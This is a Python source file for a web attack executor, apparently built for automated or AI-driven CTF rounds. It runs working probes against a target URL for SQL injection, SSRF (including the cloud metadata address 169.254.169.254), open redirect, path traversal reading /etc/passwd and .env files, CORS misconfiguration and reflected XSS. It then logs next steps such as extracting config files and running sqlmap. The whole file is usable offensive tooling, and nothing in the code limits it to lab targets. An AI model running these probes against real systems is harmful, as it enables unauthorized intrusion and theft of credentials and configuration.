#!/usr/bin/env python3
"""Deterministic Web CTF attack executor for workflow/autopilot rounds."""

from __future__ import annotations

import argparse
import html.parser
import json
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parents[2]
DEFAULT_USER_AGENT = "ReverseLab-CTF-AttackExecutor/1.0"
SSRF_PARAM_NAMES = {"url", "uri", "redirect", "callback", "next", "return", "proxy", "fetch", "webhook", "image", "avatar", "src", "dest", "target"}
FILE_PARAM_NAMES = {"file", "path", "page", "template", "include", "download", "view", "doc", "document", "read", "load", "img", "image"}


class AssetParser(html.parser.HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.links: list[str] = []
        self.scripts: list[str] = []
        self.forms: list[dict[str, Any]] = []
        self._form: dict[str, Any] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        data = {k.lower(): v for k, v in attrs}
        if tag == "a" and data.get("href"):
            self.links.append(data["href"] or "")
        elif tag == "script" and data.get("src"):
            self.scripts.append(data["src"] or "")
        elif tag == "form":
            self._form = {"action": data.get("action", ""), "method": data.get("method", "GET"), "inputs": []}
            self.forms.append(self._form)
        elif tag in {"input", "textarea", "select"} and self._form is not None:
            self._form["inputs"].append({"name": data.get("name", ""), "type": data.get("type", tag)})

    def handle_endtag(self, tag: str) -> None:
        if tag == "form":
            self._form = None


def utc_ms() -> int:
    return int(time.time() * 1000)


def load_manifest(path: Path) -> dict[str, Any]:
    return json.loads(path.read_text(encoding="utf-8"))


def save_manifest(path: Path, manifest: dict[str, Any]) -> None:
    path.write_text(json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8")


def workspace_path(raw_path: str, fallback: Path) -> Path:
    if not raw_path:
        return fallback
    path = Path(raw_path).expanduser()
    if not path.is_absolute():
        path = ROOT / path
    return path.resolve()


def display_path(path: Path) -> str:
    try:
        return str(path.resolve().relative_to(ROOT))
    except ValueError:
        return str(path.resolve())


def request_url(url: str, *, timeout: float = 8.0, headers: dict[str, str] | None = None, max_body: int = 256 * 1024) -> dict[str, Any]:
    req_headers = {"User-Agent": DEFAULT_USER_AGENT, "Accept": "text/html,application/json,*/*"}
    if headers:
        req_headers.update(headers)
    req = urllib.request.Request(url, headers=req_headers)
    started = time.time()
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read(max_body)
            return {
                "url": url,
                "final_url": resp.geturl(),
                "status": resp.status,
                "elapsed_ms": round((time.time() - started) * 1000, 2),
                "headers": dict(resp.headers.items()),
                "body_text": body.decode("utf-8", errors="replace"),
                "body_size": len(body),
                "error": "",
            }
    except urllib.error.HTTPError as exc:
        body = exc.read(max_body)
        return {
            "url": url,
            "final_url": exc.geturl(),
            "status": exc.code,
            "elapsed_ms": round((time.time() - started) * 1000, 2),
            "headers": dict(exc.headers.items()),
            "body_text": body.decode("utf-8", errors="replace"),
            "body_size": len(body),
            "error": str(exc),
        }
    except Exception as exc:
        return {
            "url": url,
            "status": 0,
            "elapsed_ms": round((time.time() - started) * 1000, 2),
            "headers": {},
            "body_text": "",
            "body_size": 0,
            "error": repr(exc),
        }


def append_query(url: str, params: dict[str, str]) -> str:
    parsed = urllib.parse.urlsplit(url)
    query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    query.update(params)
    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", urllib.parse.urlencode(query), parsed.fragment))


def output_dir(manifest: dict[str, Any], manifest_path: Path, name: str) -> Path:
    paths = manifest.get("paths", {}) or {}
    fallback = ROOT / "exports" / "ctf-website" / str(manifest.get("case") or manifest_path.parent.name)
    out = workspace_path(str(paths.get("exports") or ""), fallback) / "attack-executor" / name
    out.mkdir(parents=True, exist_ok=True)
    return out


def target_url(manifest: dict[str, Any]) -> str:
    return str((manifest.get("target") or {}).get("url") or "").strip()


def add_evidence(manifest: dict[str, Any], item: dict[str, Any]) -> None:
    manifest.setdefault("evidence", []).append({"time_ms": utc_ms(), "source": "ctf_attack_executor", **item})


def add_focus(manifest: dict[str, Any], action: str, reason: str, priority: str = "P1") -> None:
    manifest.setdefault("next_round_focus", []).append({"action": action, "reason": reason, "priority": priority})


def parse_assets(base_url: str, html: str) -> dict[str, list[Any]]:
    parser = AssetParser()
    parser.feed(html)
    return {
        "links": sorted({urllib.parse.urljoin(base_url, item) for item in parser.links}),
        "scripts": sorted({urllib.parse.urljoin(base_url, item) for item in parser.scripts}),
        "forms": parser.forms,
    }


def probe_routes(manifest: dict[str, Any], manifest_path: Path, *, limit: int) -> dict[str, Any]:
    base = target_url(manifest)
    if not base:
        return {"status": "skipped", "reason": "target.url missing"}
    wordlist = ROOT / "tools" / "ctf-website" / "wordlists" / "small-routes.txt"
    candidates = ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt", "/api", "/api/v1", "/graphql"]
    if wordlist.exists():
        candidates.extend(line.strip() for line in wordlist.read_text(encoding="utf-8").splitlines() if line.strip() and not line.startswith("#"))
    seen: set[str] = set()
    results: list[dict[str, Any]] = []
    for route in candidates:
        if len(results) >= limit:
            break
        url = urllib.parse.urljoin(base.rstrip("/") + "/", route.lstrip("/"))
        if url in seen:
            continue
        seen.add(url)
        resp = request_url(url, max_body=16 * 1024)
        summary = {k: resp[k] for k in ("url", "final_url", "status", "elapsed_ms", "body_size", "error") if k in resp}
        results.append(summary)
    interesting = [item for item in results if item.get("status") in {200, 204, 301, 302, 401, 403}]
    out = output_dir(manifest, manifest_path, "routes")
    artifact = out / "routes.json"
    artifact.write_text(json.dumps({"results": results, "interesting": interesting}, ensure_ascii=False, indent=2), encoding="utf-8")
    if interesting:
        add_evidence(manifest, {"type": "route_discovery", "artifact": display_path(artifact), "count": len(interesting)})
        add_focus(manifest, "Review discovered routes for API/auth/injection pivots", f"{len(interesting)} interesting routes found", "P0")
    return {"status": "executed", "handler": "probe_routes", "interesting_count": len(interesting), "artifact": display_path(artifact)}


def inspect_javascript(manifest: dict[str, Any], manifest_path: Path, *, limit: int) -> dict[str, Any]:
    base = target_url(manifest)
    scripts = list(((manifest.get("parsed") or {}).get("scripts")) or [])
    if not scripts and base:
        baseline = request_url(base)
        assets = parse_assets(baseline.get("final_url") or base, baseline.get("body_text", ""))
        scripts = assets["scripts"]
    endpoint_tokens: set[str] = set()
    fetched: list[dict[str, Any]] = []
    for script in scripts[:limit]:
        resp = request_url(script, max_body=512 * 1024)
        body = resp.get("body_text", "")
        for token in set(part.strip("'\"`);, ") for part in body.replace("\\/", "/").split()):
            if token.startswith(("/api/", "/graphql", "/admin", "/auth", "/oauth", "http://", "https://")):
                endpoint_tokens.add(token)
        fetched.append({"url": script, "status": resp.get("status"), "body_size": resp.get("body_size"), "error": resp.get("error")})
    out = output_dir(manifest, manifest_path, "javascript")
    artifact = out / "js-endpoints.json"
    payload = {"scripts": fetched, "endpoints": sorted(endpoint_tokens)}
    artifact.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
    if endpoint_tokens:
        add_evidence(manifest, {"type": "js_endpoint_mining", "artifact": display_path(artifact), "count": len(endpoint_tokens)})
        add_focus(manifest, "Probe JavaScript-discovered endpoints", f"{len(endpoint_tokens)} endpoint tokens found", "P0")
    return {"status": "executed", "handler": "inspect_javascript", "endpoint_count": len(endpoint_tokens), "artifact": display_path(artifact)}


def probe_cors(manifest: dict[str, Any], manifest_path: Path, *, origin: str) -> dict[str, Any]:
    base = target_url(manifest)
    if not base:
        return {"status": "skipped", "reason": "target.url missing"}
    baseline = request_url(base, max_body=4096)
    probe = request_url(base, headers={"Origin": origin}, max_body=4096)
    headers = {k.lower(): v for k, v in (probe.get("headers") or {}).items()}
    acao = headers.get("access-control-allow-origin", "")
    acac = headers.get("access-control-allow-credentials", "")
    finding = bool(acao == origin and acac.lower() == "true")
    out = output_dir(manifest, manifest_path, "cors")
    artifact = out / "cors.json"
    artifact.write_text(json.dumps({"baseline": baseline, "probe": probe, "origin": origin, "finding": finding}, ensure_ascii=False, indent=2), encoding="utf-8")
    if finding:
        add_evidence(manifest, {"type": "cors_misconfig", "artifact": display_path(artifact), "origin": origin})
        add_focus(manifest, "Chain CORS read with credential/session targets", "ACAO reflects origin with credentials", "P0")
    return {"status": "executed", "handler": "probe_cors", "finding": finding, "artifact": display_path(artifact)}


def probe_sqli(manifest: dict[str, Any], manifest_path: Path, *, limit: int) -> dict[str, Any]:
    candidates = list(((manifest.get("parsed") or {}).get("links")) or [])
    base = target_url(manifest)
    if base:
        candidates.insert(0, base)
    tested: list[dict[str, Any]] = []
    suspicious: list[dict[str, Any]] = []
    for url in candidates:
        parsed = urllib.parse.urlsplit(url)
        params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        if not params:
            continue
        if len(tested) >= limit:
            break
        name, value = params[0]
        normal = request_url(url, max_body=32 * 1024)
        quote = request_url(append_query(url, {name: value + "'"}), max_body=32 * 1024)
        true_probe = request_url(append_query(url, {name: f"{value} AND 1=1"}), max_body=32 * 1024)
        false_probe = request_url(append_query(url, {name: f"{value} AND 1=2"}), max_body=32 * 1024)
        record = {
            "url": url,
            "parameter": name,
            "normal_status": normal.get("status"),
            "quote_status": quote.get("status"),
            "true_size": true_probe.get("body_size"),
            "false_size": false_probe.get("body_size"),
            "quote_error": quote.get("error"),
        }
        if quote.get("status") != normal.get("status") or abs((true_probe.get("body_size") or 0) - (false_probe.get("body_size") or 0)) > 128:
            suspicious.append(record)
        tested.append(record)
    out = output_dir(manifest, manifest_path, "sqli")
    artifact = out / "sqli-differential.json"
    artifact.write_text(json.dumps({"tested": tested, "suspicious": suspicious}, ensure_ascii=False, indent=2), encoding="utf-8")
    if suspicious:
        add_evidence(manifest, {"type": "sqli_differential", "artifact": display_path(artifact), "count": len(suspicious)})
        add_focus(manifest, "Run sqlmap/request replay for suspicious SQLi parameters", f"{len(suspicious)} suspicious parameters", "P0")
    return {"status": "executed", "handler": "probe_sqli", "tested": len(tested), "suspicious_count": len(suspicious), "artifact": display_path(artifact)}


def probe_ssrf(manifest: dict[str, Any], manifest_path: Path, *, targets: list[str], limit: int) -> dict[str, Any]:
    candidates = []
    for url in ((manifest.get("parsed") or {}).get("links")) or []:
        query = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query, keep_blank_values=True))
        for key in query:
            if key.lower() in SSRF_PARAM_NAMES:
                candidates.append((url, key))
    tested: list[dict[str, Any]] = []
    for url, key in candidates[:limit]:
        baseline = request_url(url, max_body=8192)
        for target in targets:
            probe = request_url(append_query(url, {key: target}), max_body=8192)
            tested.append({"url": url, "parameter": key, "payload": target, "baseline_ms": baseline.get("elapsed_ms"), "probe_ms": probe.get("elapsed_ms"), "status": probe.get("status"), "error": probe.get("error")})
    out = output_dir(manifest, manifest_path, "ssrf")
    artifact = out / "ssrf-differential.json"
    artifact.write_text(json.dumps({"tested": tested}, ensure_ascii=False, indent=2), encoding="utf-8")
    if tested:
        add_focus(manifest, "Review SSRF differential probes", f"{len(tested)} SSRF payload probes executed", "P1")
    return {"status": "executed", "handler": "probe_ssrf", "tested": len(tested), "artifact": display_path(artifact)}


def probe_open_redirect(manifest: dict[str, Any], manifest_path: Path, *, redirect_host: str, limit: int) -> dict[str, Any]:
    payloads = [
        f"https://{redirect_host}",
        f"//{redirect_host}",
        f"https:%2F%2F{redirect_host}",
        f"\\\\{redirect_host}",
    ]
    candidates = []
    for url in ((manifest.get("parsed") or {}).get("links")) or []:
        query = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query, keep_blank_values=True))
        for key in query:
            if key.lower() in {"redirect", "redirect_uri", "return", "return_to", "next", "goto", "url", "service", "continue"}:
                candidates.append((url, key))
    tested: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    for url, key in candidates[:limit]:
        for payload in payloads:
            probe_url = append_query(url, {key: payload})
            resp = request_url(probe_url, max_body=8192)
            location = ""
            for header, value in (resp.get("headers") or {}).items():
                if header.lower() == "location":
                    location = value
                    break
            record = {"url": url, "parameter": key, "payload": payload, "status": resp.get("status"), "location": location}
            tested.append(record)
            if redirect_host in location:
                findings.append(record)
    out = output_dir(manifest, manifest_path, "open-redirect")
    artifact = out / "open-redirect.json"
    artifact.write_text(json.dumps({"tested": tested, "findings": findings}, ensure_ascii=False, indent=2), encoding="utf-8")
    if findings:
        add_evidence(manifest, {"type": "open_redirect", "artifact": display_path(artifact), "count": len(findings)})
        add_focus(manifest, "Chain open redirect into OAuth/CAS/SSRF paths", f"{len(findings)} redirect variants found", "P0")
    return {"status": "executed", "handler": "probe_open_redirect", "tested": len(tested), "finding_count": len(findings), "artifact": display_path(artifact)}


def probe_lfi(manifest: dict[str, Any], manifest_path: Path, *, payloads: list[str], limit: int) -> dict[str, Any]:
    candidates = []
    for url in ((manifest.get("parsed") or {}).get("links")) or []:
        query = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query, keep_blank_values=True))
        for key in query:
            if key.lower() in FILE_PARAM_NAMES:
                candidates.append((url, key))
    tested: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    signatures = ["root:x:0:0:", "[extensions]", "for 16-bit app support", "<web-app", "DB_PASSWORD", "APP_KEY="]
    for url, key in candidates[:limit]:
        for payload in payloads:
            probe_url = append_query(url, {key: payload})
            resp = request_url(probe_url, max_body=64 * 1024)
            body = resp.get("body_text", "")
            matched = [sig for sig in signatures if sig in body]
            record = {"url": url, "parameter": key, "payload": payload, "status": resp.get("status"), "body_size": resp.get("body_size"), "matched": matched}
            tested.append(record)
            if matched:
                findings.append(record)
    out = output_dir(manifest, manifest_path, "lfi")
    artifact = out / "lfi.json"
    artifact.write_text(json.dumps({"tested": tested, "findings": findings}, ensure_ascii=False, indent=2), encoding="utf-8")
    if findings:
        add_evidence(manifest, {"type": "lfi_path_traversal", "artifact": display_path(artifact), "count": len(findings)})
        add_focus(manifest, "Use file read to extract config/source/flag paths", f"{len(findings)} LFI signatures found", "P0")
    return {"status": "executed", "handler": "probe_lfi", "tested": len(tested), "finding_count": len(findings), "artifact": display_path(artifact)}


def probe_xss_reflection(manifest: dict[str, Any], manifest_path: Path, *, limit: int) -> dict[str, Any]:
    payload = "reverselab-xss-probe"
    reflected: list[dict[str, Any]] = []
    tested = 0
    for url in ((manifest.get("parsed") or {}).get("links")) or []:
        query = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query, keep_blank_values=True))
        for key in query:
            if tested >= limit:
                break
            probe_url = append_query(url, {key: payload})
            resp = request_url(probe_url, max_body=32 * 1024)
            tested += 1
            if payload in resp.get("body_text", ""):
                reflected.append({"url": url, "parameter": key, "status": resp.get("status")})
    out = output_dir(manifest, manifest_path, "xss")
    artifact = out / "xss-reflection.json"
    artifact.write_text(json.dumps({"tested": tested, "reflected": reflected}, ensure_ascii=False, indent=2), encoding="utf-8")
    if reflected:
        add_evidence(manifest, {"type": "xss_reflection", "artifact": display_path(artifact), "count": len(reflected)})
        add_focus(manifest, "Escalate reflected parameters to context-aware XSS payloads", f"{len(reflected)} reflected parameters", "P0")
    return {"status": "executed", "handler": "probe_xss_reflection", "tested": tested, "reflected_count": len(reflected), "artifact": display_path(artifact)}


def execute(
    manifest_path: Path,
    probes: list[str],
    *,
    limit: int,
    origin: str,
    ssrf_targets: list[str],
    redirect_host: str,
    lfi_payloads: list[str],
    write: bool,
) -> dict[str, Any]:
    manifest = load_manifest(manifest_path)
    results = []
    for probe in probes:
        if probe == "routes":
            results.append(probe_routes(manifest, manifest_path, limit=limit))
        elif probe == "javascript":
            results.append(inspect_javascript(manifest, manifest_path, limit=limit))
        elif probe == "cors":
            results.append(probe_cors(manifest, manifest_path, origin=origin))
        elif probe == "sqli":
            results.append(probe_sqli(manifest, manifest_path, limit=limit))
        elif probe == "ssrf":
            results.append(probe_ssrf(manifest, manifest_path, targets=ssrf_targets, limit=limit))
        elif probe == "open_redirect":
            results.append(probe_open_redirect(manifest, manifest_path, redirect_host=redirect_host, limit=limit))
        elif probe == "lfi":
            results.append(probe_lfi(manifest, manifest_path, payloads=lfi_payloads, limit=limit))
        elif probe == "xss":
            results.append(probe_xss_reflection(manifest, manifest_path, limit=limit))
        else:
            results.append({"status": "skipped", "handler": probe, "reason": "unknown probe"})
    if write:
        save_manifest(manifest_path, manifest)
    return {"manifest": str(manifest_path), "probes": probes, "results": results}


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Run deterministic Web CTF attack executor probes.")
    parser.add_argument("manifest", help="Path to ai_manifest.json")
    parser.add_argument("--probe", action="append", choices=["routes", "javascript", "cors", "sqli", "ssrf", "open_redirect", "lfi", "xss"], help="Probe to run; can repeat.")
    parser.add_argument("--all", action="store_true", help="Run all deterministic probes.")
    parser.add_argument("--limit", type=int, default=20, help="Per-probe request/item limit.")
    parser.add_argument("--origin", default="https://origin.invalid", help="Origin header for CORS probe.")
    parser.add_argument("--redirect-host", default="redirect.invalid", help="External host marker for open redirect probes.")
    parser.add_argument("--ssrf-target", action="append", default=[], help="SSRF payload target; can repeat.")
    parser.add_argument("--lfi-payload", action="append", default=[], help="LFI/path traversal payload; can repeat.")
    parser.add_argument("--no-write", action="store_true", help="Do not write evidence/focus back to manifest.")
    args = parser.parse_args(argv)

    probes = ["routes", "javascript", "cors", "sqli", "ssrf", "open_redirect", "lfi", "xss"] if args.all else (args.probe or [])
    if not probes:
        parser.error("provide --probe or --all")
    ssrf_targets = args.ssrf_target or ["http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/"]
    lfi_payloads = args.lfi_payload or ["../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "../../../windows/win.ini", "WEB-INF/web.xml", ".env"]
    result = execute(
        Path(args.manifest).expanduser().resolve(),
        probes,
        limit=args.limit,
        origin=args.origin,
        ssrf_targets=ssrf_targets,
        redirect_host=args.redirect_host,
        lfi_payloads=lfi_payloads,
        write=not args.no_write,
    )
    print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
